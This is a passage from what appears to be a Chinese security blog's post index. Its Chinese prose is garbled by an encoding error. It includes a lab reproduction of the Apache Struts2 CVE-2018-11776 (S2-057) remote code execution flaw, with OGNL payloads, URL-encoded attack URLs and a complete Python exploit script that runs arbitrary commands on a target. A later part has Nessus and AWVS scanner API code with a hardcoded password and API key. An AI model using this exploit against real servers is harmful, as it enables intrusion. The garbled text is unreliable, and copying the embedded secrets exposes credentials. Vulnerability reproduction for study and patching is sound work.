‡ç¨‹åºçš„è¯¦ç»†ä¿¡æ¯ å¯ä»¥çœ‹å‡ºè¿™ä¸ªç¨‹åºçš„æ ¼å¼ä¸ºelf(å¯¹åº”çš„Windowsä¸‹çš„ç¼–è¯‘çš„ä¸ºpie) 64ä¸ºç¨‹åºï¼Œå› ä¸ºå¤„ç†å™¨æ˜¯å‘ä¸‹å…¼å®¹çš„å¦‚æœè¦ç”Ÿæˆ32ä½ç¨‹åºå¯ä»¥ä½¿ç”¨ (-m32) åœ¨ç¼–è¯‘ä¸­åˆ°åº•ç»å†äº†å“ªäº›é˜¶æ®µ é¢„å¤„ç†é˜¶æ®µï¼ˆcppï¼‰æ ¹æ®ä»¥#å·å¼€å¤´çš„å‘½ä»¤ï¼Œä¿®æ”¹åŸå§‹çš„cç¨‹åºï¼Œæ¯”å¦‚helloworld ä¸­çš„ç¬¬ä¸€è¡Œ #includeå‘½ä»¤å‘Šè¯‰é¢„å¤„ç†å™¨è¯»å–ç³»ç»Ÿå¤´æ–‡ä»¶stdio.h çš„å†…å®¹.å¹¶æŠŠä»–ç›´æ¥æ’å…¥ç¨‹åºæ–‡æœ¬ä¸­ï¼Œå¾—åˆ°ä¸€ä¸ªcç¨‹åº ,é€šå¸¸æ˜¯ä»¥ .i ä¸ºæ‰©å¼ åã€‚stdio.h æ–‡ä»¶åœ¨Linuxä¸­çš„ï¼ˆ/usr/includeç›®å½•ä¸‹) ç¼–è¯‘é˜¶æ®µï¼Œæ±‡ç¼–å™¨(ccl)ä¸ºæŠŠä¸Šé¢çš„helloworld.i åä¹‰æˆhello.sä»–åŒ…å«ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼Œç”¨ï¼ˆidaæŸ¥çœ‹æ±‡ç¼–ç¨‹åºï¼‰ æ±‡ç¼–é˜¶æ®µï¼šæŠŠæºç¨‹åºçš„helloworld.s ç¿»è¯‘æˆæœºå™¨è¯­è¨€æŒ‡ä»¤ã€‚å¹¶å°†ç»“æœä¿å­˜åœ¨ helloworld.oæ–‡ä»¶ä¸­ï¼Œhelloworld.o æ˜¯ä¸€ä¸ª2è¿›åˆ¶æ–‡ä»¶ é“¾æ¥é˜¶æ®µï¼š æºç¨‹åºä¸­çš„hellworld è°ƒç”¨äº†printf å‡½æ•° ï¼Œä»–æ˜¯æ¯ä¸€ä¸ª\bC ç¼–è¾‘å™¨æä¾›çš„æ ‡å‡†cåº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œprintf å‡½æ•°å­˜åœ¨ä¸€ä¸ªåä¸ºprintf.oçš„å•ç‹¬çš„é¢„ç¼–è¯‘å¥½çš„ç›®æ ‡æ–‡ä¸­ä¸­ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¿…é¡»ä»¥æŸç§å½¢å¼åˆå¹¶åˆ°æˆ‘ä»¬helloworld.oç¨‹åºä¸­é“¾æ¥å™¨(ld)å°±è´Ÿè´£è¿™ç§åˆå¹¶ã€‚ç»“æœç”Ÿäº§ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ä¸ºhelloworldã€‚ ida æŸ¥çœ‹é“¾æ¥çš„printf å‡½æ•° è¿è¡Œhelloworldç¨‹åºï¼š","categories":[{"name":"helloworldç”Ÿå‘½å‘¨æœŸ","slug":"helloworldç”Ÿå‘½å‘¨æœŸ","permalink":"http://yubenliu.cn/categories/helloworldç”Ÿå‘½å‘¨æœŸ/"}],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"http://yubenliu.cn/tags/é€†å‘/"},{"name":"è®¡ç®—æœºç³»ç»Ÿ","slug":"è®¡ç®—æœºç³»ç»Ÿ","permalink":"http://yubenliu.cn/tags/è®¡ç®—æœºç³»ç»Ÿ/"}]},{"title":"CVE-2018-11776æ¼æ´å¤ç°","slug":"CVE-2018-11776æ¼æ´å¤ç°","date":"2019-08-02T06:20:00.000Z","updated":"2019-11-08T06:44:22.204Z","comments":true,"path":"2019/08/02/CVE-2018-11776æ¼æ´å¤ç°/","link":"","permalink":"http://yubenliu.cn/2019/08/02/CVE-2018-11776æ¼æ´å¤ç°/","excerpt":"","text":"0x01 æ¼æ´æ¦‚è¿°2018å¹´8æœˆ23æ—¥ï¼ŒApacheStrust2å‘å¸ƒæœ€æ–°å®‰å…¨å…¬å‘Šï¼ŒApacheStruts2 å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œçš„é«˜å±æ¼æ´ï¼Œè¯¥æ¼æ´ç”±SemmleSecurity Researchteamçš„å®‰å…¨ç ”ç©¶å‘˜æ±‡æŠ¥ï¼Œæ¼æ´ç¼–å·ä¸ºCVE-2018-11776ï¼ˆS2-057ï¼‰ã€‚ å®šä¹‰XMLé…ç½®æ—¶å¦‚æœnamespaceå€¼æœªè®¾ç½®ä¸”ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆAction Configurationï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceæ—¶å¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚URLæ ‡ç­¾æœªè®¾ç½®valueå’Œactionå€¼ä¸”ä¸Šå±‚åŠ¨ä½œæœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceæ—¶å¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»¥åŠç³»ç»Ÿå‘½ä»¤åˆ°æœåŠ¡å™¨ç³»ç»Ÿä¸­å» ã€‚ 0x02 å½±å“ç‰ˆæœ¬Apache struts 2.3-Apache struts 2.3.34 Apache struts 2.5-Apache struts 2.5.16 0x03 æ¼æ´å¤ç°å¤ç°ç¯å¢ƒ windows 10 jdk1.8.0_191 apache-tomcat-7.0.96 struts-2.3.34 ç¯å¢ƒæ­å»ºé¦–å…ˆå®‰è£…jdkï¼Œå¹¶é…ç½®ç¯å¢ƒå˜é‡ï¼Œä¸å†èµ˜è¿° ä¸‹è½½ apache-tomcat å¹¶è§£å‹ ä¸‹è½½ Struts-2.3.34 è§£å‹ï¼Œå¹¶å°†appsç›®å½•ä¸‹çš„ struts2-showcase.war å¤åˆ¶åˆ°tomcatçš„webappsç›®å½•ä¸‹ åœ¨tomcatä¸‹binç›®å½•ä¸‹è¿è¡Œstartup.batè„šæœ¬æ¥å¯åŠ¨tomcatï¼Œå¯åŠ¨åè‡ªåŠ¨éƒ¨ç½²struts2 æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/struts2-showcaseï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºéƒ¨ç½²æˆåŠŸäº†ã€‚ æ­£å¸¸éƒ¨ç½²å®Œæˆstrutså¦‚ä¸Šæ‰€ç¤ºï¼Œä½†ä¸ºäº†å¤ç°struts2-057æ¼æ´ï¼Œéœ€è¦ä¿®æ”¹å¦‚ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼ˆtomcatç›®å½•ä¸‹ï¼‰ D:\\Program Files\\Java\\apache-tomcat-7.0.96\\webapps\\struts2-showcase\\WEB-INF\\src\\java\\struts-actionchaining.xml D:\\Program Files\\Java\\apache-tomcat-7.0.96\\webapps\\struts2-showcase\\WEB-INF\\classes\\struts-actionchaining.xml æ³¨é‡Šæ‰åŸæ¥çš„xmlä»£ç ï¼Œä¿®æ”¹å¦‚ä¸‹ &lt;struts&gt; &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt; &lt;result type=&quot;redirectAction&quot;&gt; &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt; &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt; &lt;/action&gt; &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt; &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; åœ¨tomcatä¸‹binç›®å½•ä¸‹è¿è¡Œshutdown.batï¼Œstartup.batè„šæœ¬æ¥é‡å¯tomcatã€‚é‡å¯tomcatï¼ï¼ï¼é‡å¯tomcatï¼ï¼ï¼é‡å¯tomcatï¼ï¼ï¼æµè§ˆå™¨è®¿é—®http://192.168.10.230:8080/struts2-showcase/,æ¼æ´ç¯å¢ƒæˆåŠŸæ­å»º æ¼æ´åˆ©ç”¨åœ¨URLæ„é€ ognlè¡¨è¾¾å¼ï¼Œå†åŠ ä¸Šé…ç½®æ–‡ä»¶ä¸­çš„actionæ ‡ç­¾ä¸­çš„nameå±æ€§å€¼ï¼Œå¹¶ä»¥.actionç»“å°¾http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.actionæ‰§è¡Œå®Œæˆä¹‹åå‘ç°è·³è½¬åˆ°äº†http://127.0.0.1:8080/struts2-showcase/100/register2.actionæ‰§è¡Œäº†ognl è¡¨è¾¾å¼ ${(50+50)},æ¼æ´å­˜åœ¨ è¿›ä¸€æ­¥åˆ©ç”¨æ¼æ´ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ„é€ payload ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))} è¿›è¡ŒURLç¼–ç  %24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d æ‹¼æ¥ 127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action æˆåŠŸæ‰§è¡Œ EXP#coding: utf-8 #! python2 import requests import sys def expliot(host, command, path): &#39;&#39;&#39; 2.3.34ç‰ˆæœ¬ payload1: ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())} 2.3.20ç‰ˆæœ¬ payload2: ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())} &#39;&#39;&#39; str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot; str1 = str1.encode(&#39;hex&#39;) str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot; str2 = str2.encode(&#39;hex&#39;) # éœ€è¦è¿›è¡ŒURLç¼–ç  payload1 = &quot;&quot; for i in range(0, len(str1), 2): payload1 += &#39;%&#39; + str1[i:i + 2] payload2 = &quot;&quot; for i in range(0, len(str2), 2): payload2 += &#39;%&#39; + str2[i:i + 2] url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path res1 = requests.get(url1, allow_redirects=False) res2 = requests.get(url2, allow_redirects=False) if res1.status_code == 200 and res2.status_code != 200: print(&quot;Exploit successful:&quot;) print(res1.content) elif res2.status_code == 200 and res1.status_code != 200: print(&quot;Exploit successful:&quot;) print(res2.content) else: print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;) if __name__ == &#39;__main__&#39;: if len(sys.argv) &lt; 4: print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;) else: expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip()) ä½¿ç”¨æ–¹æ³•ï¼š python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action} ä¾‹å¦‚:python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action å‚è€ƒæ–‡ç« CVE-2018-11776æ¼æ´ä»æ­å»ºåˆ°å¤ç°","categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://yubenliu.cn/categories/webå®‰å…¨/"}],"tags":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://yubenliu.cn/tags/æ¼æ´å¤ç°/"},{"name":"CVE-2018-11776","slug":"CVE-2018-11776","permalink":"http://yubenliu.cn/tags/CVE-2018-11776/"},{"name":"struts2","slug":"struts2","permalink":"http://yubenliu.cn/tags/struts2/"}]},{"title":"nessusä¸awvs API","slug":"scan","date":"2019-08-02T06:20:00.000Z","updated":"2019-11-08T10:38:01.779Z","comments":true,"path":"2019/08/02/scan/","link":"","permalink":"http://yubenliu.cn/2019/08/02/scan/","excerpt":"å‰è¨€ æœ€è¿‘åœ¨åšè‡ªåŠ¨åŒ–å®‰å…¨æ‰«æå™¨å¼€å‘ï¼Œåœ¨é¡¹ç›®ä¸­æƒ³å¼•ç”¨æ¯”è¾ƒçŸ¥åçš„æ‰«æå™¨ï¼Œå¦‚æ˜¯æ•´ç†äº†ä¸€ä¸‹APIä½œä¸ºå‚è€ƒ","text":"å‰è¨€ æœ€è¿‘åœ¨åšè‡ªåŠ¨åŒ–å®‰å…¨æ‰«æå™¨å¼€å‘ï¼Œåœ¨é¡¹ç›®ä¸­æƒ³å¼•ç”¨æ¯”è¾ƒçŸ¥åçš„æ‰«æå™¨ï¼Œå¦‚æ˜¯æ•´ç†äº†ä¸€ä¸‹APIä½œä¸ºå‚è€ƒ Nessus 6.xç‰ˆæœ¬#!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 2017/8/21 ä¸‹åˆ4:08 # @Author : Yu BenLiu # @Site : QVQ # @File : nessus_api_6.py.py # @Software: PyCharm import sys # sys.path.append(&quot;..&quot;) import requests, json, csv, os, time from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # from core.settings import talscan_config,redis_task from host_type_check import * talscan_config = {&quot;report_filters&quot;: { &quot;awvs_white_list&quot;: [&quot;orange&quot;, &quot;red&quot;, &quot;blue&quot;], # green,blue,orange,redå››ç§çº§åˆ« &quot;nessus_white_list&quot;: [&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;], &quot;bug_black_list&quot;: [ # æ¼æ´é»‘åå•ï¼Œè¿‡æ»¤æ‰ä¸€äº›å±å®³ç­‰çº§é«˜ï¼Œä½†æ²¡ä»€ä¹ˆåµç”¨çš„æ´ &quot;User credentials are sent in clear text&quot; ] } } class Work(object): def __init__(self, scan_id=&quot;&quot;, scan_uuid=&quot;&quot;,scan_target=&quot;&quot;, scan_type=&quot;&quot;, scan_args=&quot;&quot;, back_fn=None): self.api_url = &#39;https://192.168.29.198:8834&#39; self.username = &quot;root&quot; self.password = &quot;ybl8651073&quot; self.filter = talscan_config[&quot;report_filters&quot;] self.report_save_dir = &#39;/tmp/&#39; self.verify = False self.token = &#39;&#39; self.enable = True self.scan_uuid=scan_uuid self.scan_id = scan_id self.target = scan_target self.scan_type = scan_type self.args = scan_args self.back_fn = back_fn self.result = {} def connect(self, method, resource, data=None, params=None): headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(self.token), &#39;content-type&#39;: &#39;application/json&#39;} data = json.dumps(data) try: if method == &#39;POST&#39;: r = requests.post(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) elif method == &#39;PUT&#39;: r = requests.put(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) elif method == &#39;DELETE&#39;: r = requests.delete(str(self.api_url + resource), data=data, headers=headers, verify=self.verify) else: r = requests.get(str(self.api_url + resource), params=params, headers=headers, verify=self.verify) except Exception, e: print e return {&quot;status&quot;: 3} if r.status_code == 200: try: data = r.json() except: data = r.content result = {&quot;status&quot;: 1, &quot;data&quot;: data} return result else: result = {&quot;status&quot;: 3} return result def nessus_login(self): login = {&#39;username&#39;: self.username, &#39;password&#39;: self.password} data = self.connect(&#39;POST&#39;, &#39;/session&#39;, data=login) print data status = data[&quot;status&quot;] print status if status == 1: result = {&quot;status&quot;: 1, &quot;data&quot;: data[&quot;data&quot;][&#39;token&#39;]} print result return result else: result = {&quot;status&quot;: 0} print result return result def nessus_process_status(self, sid): # canceled,running,completed data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = self.api_url + &#39;/scans/&#39; data = requests.get(url=url, params=None, headers=headers, verify=self.verify) res = data.json() info1=res[&#39;scans&#39;] print info1 try: return info1 except: return {&quot;status&quot;: 0} def nessus_policies(self,): data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = self.api_url + &#39;/policies/&#39; data = requests.get(url=url, params=None, headers=headers, verify=self.verify) res = data.json() info=res[&#39;policies&#39;] print info try: return info except: return {&quot;status&quot;: 0} def nessus_add_task(self): if is_domain(self.target) or is_host(self.target): create_data = { &quot;uuid&quot;: self.scan_uuid, # &quot;uuid&quot;: &#39;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&#39;,#é€‰æ‹©ç­–ç•¥ &quot;settings&quot;: { &quot;name&quot;: self.scan_id, &quot;scanner_id&quot;: &quot;1&quot;, &quot;text_targets&quot;: self.target, &quot;enabled&quot;: False, &quot;launch_now&quot;: True, } } post_data = json.dumps(create_data) data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: print &#39;99&#39; return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :ç™»é™†å¤±è´¥&quot;} headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} r = requests.post(url=str(self.api_url + &#39;/scans&#39;), data=post_data, headers=headers, verify=self.verify) if r.status_code == 200: try: get_id = r.json() except: get_id = r.content sid = get_id[&#39;scan&#39;][&#39;id&#39;] result = {&quot;status&quot;: 1, &quot;data&quot;: sid} return result else: result = {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :å¢åŠ ä»»åŠ¡å¤±è´¥&quot;} return result else: return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :æ ¼å¼é”™è¯¯&quot;} def nessus_stop_task(self, sid): data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = str(self.api_url + &#39;/scans/{0}/stop/&#39;.format(sid)) r = requests.post(url=url, params=None, headers=headers, verify=self.verify) if r.status_code == 200: result = {&quot;status&quot;: 1} return result else: result = {&quot;status&quot;: 0} return result def nessus_report_task(self, taskid, sid): bug_list = [] data = self.nessus_login() status = data[&quot;status&quot;] if status == 1: token = data[&quot;data&quot;] else: result = {&quot;status&quot;: 0} return result headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;} url = str(self.api_url + &#39;/scans/{0}/export&#39;.format(sid)) data = json.dumps({&quot;format&quot;: &quot;csv&quot;}) r = requests.post(url=url, data=data, headers=headers, verify=self.verify) try: file = r.json()[&#39;token&#39;] except: result = {&quot;status&quot;: 0} return result down_file_url = str(self.api_url + &#39;/scans/exports/{0}/download&#39;.format(file)) r = requests.get(url=down_file_url, headers=headers, verify=self.verify) csv_file = str(self.report_save_dir + &quot;{0}_nessus.csv&quot;.format(str(taskid))) f = open(csv_file, &#39;wb&#39;) data = r.content f.write(data) f.close() csv_open_file = open(csv_file, &#39;rb&#39;) csvReader = csv.reader(csv_open_file) for row in csvReader: parameterStr = &#39;,&#39;.join(row) parameters = parameterStr.split(&#39;,&#39;) PID = parameters[0] CVE = parameters[1] CVSS = parameters[2] Risk = parameters[3] Host = parameters[4] Protocol = parameters[5] Port = parameters[6] Name = parameters[7] Synopsis = parameters[8] Description = parameters[9] Solution = parameters[10] See_Also = parameters[11] Plugin_Output = parameters[12] bug_name = str(Name) bug_level = str(Risk) bug_summary = str(Synopsis) + &quot;\\r\\n&quot; + str(Description) bug_detail = &quot;Bug Port : &quot; + str(Port) + &quot;\\r\\n&quot; + &quot;CVE : &quot; + str(CVE) bug_repair = str(Solution) + &quot;\\r\\n&quot; + str(Plugin_Output) if str(Risk) in self.filter[&#39;nessus_white_list&#39;]: bug_list.append( {&#39;bug_name&#39;: bug_name, &#39;bug_level&#39;: bug_level, &#39;bug_summary&#39;: bug_summary, &#39;bug_detail&#39;: bug_detail, &#39;bug_repair&#39;: bug_repair}) csv_open_file.close() # os.remove(csv_file) if len(bug_list) &gt; 0: result = {&quot;status&quot;: 1, &quot;data&quot;: bug_list} return bug_list else: result = {&quot;status&quot;: 0} return result def run(self): result = self.nessus_add_task() status = result[&quot;status&quot;] if status == 1: nessus_id = int(result[&quot;data&quot;]) while True: time.sleep(5) nessus_process = self.nessus_process_status(nessus_id) nessus_status = nessus_process[&quot;status&quot;] if nessus_status == 1: nessus_process_data = nessus_process[&quot;data&quot;].encode(&quot;utf8&quot;) if nessus_process_data == &quot;completed&quot;: break time.sleep(20) # æ¨è¿Ÿ20ç§’ï¼Œè·å–æŠ¥å‘Š;nessusä»»åŠ¡è¿›ç¨‹åˆ°100æœ‰éƒ¨åˆ†å»¶è¿Ÿç»“æŸæ—¶é—´ nessus_report = self.nessus_report_task(self.scan_id, nessus_id) nessus_report_status = nessus_report[&quot;status&quot;] if nessus_report_status == 1: nessus_report_data = nessus_report[&quot;data&quot;] data = [] for line in nessus_report_data: task_result = { &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;, &quot;bug_author&quot;: &quot;bing&quot;, &quot;bug_name&quot;: line[&quot;bug_name&quot;], &quot;bug_level&quot;: line[&quot;bug_level&quot;], &quot;bug_summary&quot;: line[&quot;bug_summary&quot;], &quot;bug_detail&quot;: line[&quot;bug_detail&quot;], &quot;bug_repair&quot;: line[&quot;bug_repair&quot;] } redis_task.sadd(&quot;nessus_result&quot;, task_result) print task_result # ä»»åŠ¡æœ€ç»ˆç»“æŸ final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result else: # ä»»åŠ¡æœ€ç»ˆç»“æŸ final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result elif status == 2: nessus_error = result[&quot;data&quot;] final_result = {&quot;status&quot;: 2, &quot;data&quot;: nessus_error, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;} redis_task.sadd(&quot;nessus_result&quot;, final_result) print final_result #t = Work(&quot;1234455&quot;,&quot;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&quot;,&quot;www.baidu.com&quot;) #s = t.nessus_report_task(5,84) #print s Awvs æœ€æ–°çš„api#!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 2017/8/22 ä¸‹åˆ3:08 # @Author : Yu BenLiu # @Site : QVQ # @File : awvs_api_11.py.py # @Software: PyCharm import json import requests import requests.packages.urllib3 &#39;&#39;&#39; import requests.packages.urllib3.util.ssl_ requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = &#39;ALL&#39; or pip install requests[security] &#39;&#39;&#39; requests.packages.urllib3.disable_warnings() tarurl = &quot;https://192.168.29.207:3443/&quot; apikey = &quot;1986ad8c0a5b3df4d7028d5f3c06e936c38438d15a1fb4f4588e034d3c3490fef&quot; headers = {&quot;X-Auth&quot;: apikey, &quot;content-type&quot;: &quot;application/json&quot;} def addtask(url=&#39;&#39;): # æ·»åŠ ä»»åŠ¡ data = {&quot;address&quot;: url, &quot;description&quot;: url, &quot;criticality&quot;: &quot;10&quot;} try: response = requests.post(tarurl + &quot;/api/v1/targets&quot;, data=json.dumps(data), headers=headers, timeout=30, verify=False) result = json.loads(response.content) return result[&#39;target_id&#39;] except Exception as e: print(str(e)) return def startscan(url): # å…ˆè·å–å…¨éƒ¨çš„ä»»åŠ¡.é¿å…é‡å¤ # 